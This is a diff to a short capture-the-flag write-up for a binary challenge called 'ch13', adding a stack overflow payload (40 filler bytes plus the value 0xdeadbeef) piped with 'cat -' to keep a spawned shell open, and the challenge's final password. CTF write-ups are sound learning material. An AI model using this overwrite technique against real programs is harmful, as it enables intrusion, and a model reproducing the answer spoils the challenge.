@@ -5,8 +5,13 @@ Trying things like abcdefg all the way to Z t o find out at which character does
 
 Then I knew that I had to input my stdin as a piped input, since it's hard to just type ASCII strings into my terminal. So I used the command
 
+All that's finally left is to keep the shell open before it is closed by the program. We keep it open by running the command for `cat` afterwards with a `-` which interpreted as stdin
+
 ```sh
-echo -e -n '0xasdfafwlkfgrmaeorgnaeporgnapeorgmapoer\xef\xbe\xad\xde' | ./ch13
+# or
+(python -c 'print("a"*40 + "\xef\xbe\xad\xde")'; cat -) | ./ch13
 ```
 
-to make the check complete.
+the final answer we get is
+
+`1w4ntm0r3pr0np1s`
